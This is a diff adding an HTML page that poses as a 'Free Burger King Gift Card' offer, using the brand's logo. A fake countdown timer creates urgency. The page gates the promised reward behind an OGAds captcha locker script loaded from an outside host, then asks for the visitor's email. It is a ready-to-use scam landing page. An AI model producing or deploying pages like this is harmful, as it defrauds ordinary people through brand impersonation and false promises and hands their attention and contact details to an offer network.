@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Burger King Gift Card</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <div class="container">
+    <div class="card">
+
+      <!-- Countdown Timer -->
+      <div class="timer">
+        🔥 Hurry! Offer expires in <span id="countdown">10:00</span>
+      </div>
+
+      <!-- Burger King Logo -->
+      <img src="Logo_400x400.jpg" alt="Burger King Logo" class="bk-logo" />
+
+      <!-- Headline and intro -->
+      <h1>🍔 Get a Free Burger King Gift Card Today</h1>
+      <p>Complete the captcha to unlock your reward below.</p>
+
+      <!-- Embedded OGAds Captcha Locker -->
+      <div data-captcha-enable="true"></div>
+
+      <!-- Step Instructions -->
+      <div class="instructions">
+        <h2>How to Claim Your Gift Card</h2>
+        <div class="step">✅ Step 1: Confirm you're a real person via captcha</div>
+        <div class="step">📧 Step 2: Enter your email on the next screen</div>
+        <div class="step">🎁 Step 3: Receive your Burger King reward in your inbox</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- OGAds Locker Script -->
+  <script type="text/javascript" src="https://appinstallcheck.com/cp/js/7kqpr"></script>
+
+  <!-- Countdown Script -->
+<script>
+  let time = 600; // 10 minutes in seconds
+  const countdownEl = document.getElementById("countdown");
+
+  const interval = setInterval(() => {
+    const minutes = String(Math.floor(time / 60)).padStart(2, '0');
+    const seconds = String(time % 60).padStart(2, '0');
+    countdownEl.textContent = `${minutes}:${seconds}`;
+    time--;
+
+    if (time < 0) clearInterval(interval);
+  }, 1000);
+</script>
+
+</body>
+</html>
